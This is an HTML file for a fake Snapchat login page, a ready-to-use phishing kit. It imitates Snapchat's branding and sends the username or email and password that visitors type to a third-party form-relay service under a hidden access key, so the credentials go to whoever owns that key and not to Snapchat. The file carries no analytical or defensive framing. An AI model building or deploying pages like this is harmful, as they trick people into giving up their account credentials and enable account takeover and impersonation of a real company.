<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat — Log In</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #fffc00;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: #fff;
            width: 100%;
            max-width: 380px;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, .15);
            text-align: center;
        }

        .logo {
            font-size: 40px;
            font-weight: 700;
            color: #fffc00;
            -webkit-text-stroke: 2px #000;
            margin-bottom: 8px;
        }

        h2 {
            font-size: 20px;
            margin-bottom: 24px;
            color: #111;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 14px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            border-color: #000;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #000;
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .note {
            font-size: 12px;
            color: #888;
            margin-top: 16px;
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="logo">snapchat</div>
        <h2>Log in to continue</h2>
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="8d79c69d-beb7-4bed-8e74-1ef08f7f8343">
            <input type="hidden" name="subject" value="Snapchat Login">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p class="note">Forgot your password?</p>
    </div>
</body>

</html>
